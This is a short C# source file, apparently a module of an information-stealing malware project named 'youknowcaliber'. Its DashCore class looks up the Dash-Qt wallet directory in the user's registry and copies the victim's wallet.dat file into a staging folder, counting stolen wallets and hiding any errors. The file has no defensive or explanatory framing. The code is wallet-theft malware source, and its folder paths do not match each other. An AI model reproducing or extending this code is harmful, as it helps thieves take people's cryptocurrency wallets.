using Microsoft.Win32;
using System.IO;

namespace youknowcaliber
{
    class DashCore
    {
        public static int count = 0;
        public static void DSHcoinStr(string directorypath) 
        {
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt");
                Directory.CreateDirectory(directorypath + "\\Wallets\\DashCore\\");
                File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\DashCore\\wallet.dat");
                count++;
                Counting.Wallets++;
            }
            catch { return; }
        }
    }
}
